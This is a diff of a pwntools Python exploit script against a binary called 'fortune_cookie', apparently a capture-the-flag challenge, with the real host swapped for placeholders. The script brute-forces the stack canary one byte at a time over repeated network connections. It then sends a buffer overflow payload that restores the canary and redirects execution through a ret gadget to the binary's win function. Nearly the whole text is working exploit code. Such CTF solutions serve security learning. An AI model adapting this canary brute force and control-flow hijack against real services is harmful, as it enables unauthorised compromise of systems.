@@ -1,58 +1,58 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = ELF('fortune_cookie', checksec=False)
+exe = ELF('./fortune_cookie')
 context.binary = exe
-context.os = 'linux'
-context.arch = 'amd64'
+context.arch   = 'amd64'
+context.os     = 'linux'
 
-HOST, PORT             = '127.0.0.1', 4444
-OFFSECHOST, OFFSECPORT = 'offsec.m0lecon.it', 13588
-OFFSET_TO_CANARY       = 72
-OFFSET_TO_RIP          = 88
-GADGET                 = 0x000000000040101a
+HOSTNAME = 'HOSTNAME_PLACEHOLDER'
+PORT     = 0  # PORT_PLACEHOLDER
+
+# ── offsets ───────────────────────────────────────────────────────────────────
+OFFSET_TO_CANARY = 72
+OFFSET_TO_RIP    = 88   # canary + saved RBP
+
+# ── gadgets ───────────────────────────────────────────────────────────────────
+GADGET = 0x0000000000401530   # ret — stack alignment
 
 def conn(interactive=False):
-    if interactive:
-        return remote(HOST, PORT) if args.LOCAL else remote(OFFSECHOST, OFFSECPORT)
-    return remote(HOST, PORT, level='error') if args.LOCAL else remote(OFFSECHOST, OFFSECPORT, level='error')
+    level = 'info' if interactive else 'error'
+    if args.LOCAL:
+        return remote('127.0.0.1', 4444, level=level)
+    return remote(HOSTNAME, PORT, level=level)
 
 def main():
-    # use a pre-known canary with CANARY=0x... argument
-    if args.CANARY:
-        canary = int(args.CANARY, 16)
-        log.info(f'Using supplied canary: {canary:#x}')
-    else:
-        known = b"\x00"
-        for i in range(7):
-            for bval in range(256):
-                guess = known + bytes([bval])
-                payload = b"A" * OFFSET_TO_CANARY + guess
+    # ── leak phase (canary brute-force) ───────────────────────────────────────
+    known = b"\x00"
 
-                r = conn()
-                r.recvuntil(b"wish\n")
-                r.send(payload)
-                try:
-                    data = r.recv(timeout=0.2)
-                except EOFError:
-                    data = b""
-                r.close()
+    for i in range(7):
+        for bval in range(256):
+            guess = known + bytes([bval])
+            payload = b"A" * OFFSET_TO_CANARY + guess
+            r = conn()
+            r.recvuntil(b"wish\n")
+            r.send(payload)
+            try:
+                data = r.recv(timeout=0.2)
+            except EOFError:
+                data = b""
+            r.close()
+            if b"OK" in data:
+                known = guess
+                log.success(f"byte {i+1}: {bval:#04x}")
+                break
 
-                if b"OK" in data:
-                    known = guess
-                    log.success(f"byte {i+1}: {bval:02x}")
-                    break
+    canary = u64(known)
+    log.info(f"canary = {canary:#x}")
 
-        canary = u64(known)
-        log.info(f"Canary: {canary:#x}")
-
-    # final exploit
+    # ── exploit phase ─────────────────────────────────────────────────────────
     r = conn(interactive=True)
     r.recvuntil(b"wish\n")
     payload = flat(
         b"A" * OFFSET_TO_CANARY,
         p64(canary),
-        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
+        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # overwrite saved RBP
         p64(GADGET),
         p64(exe.sym.win),
     )
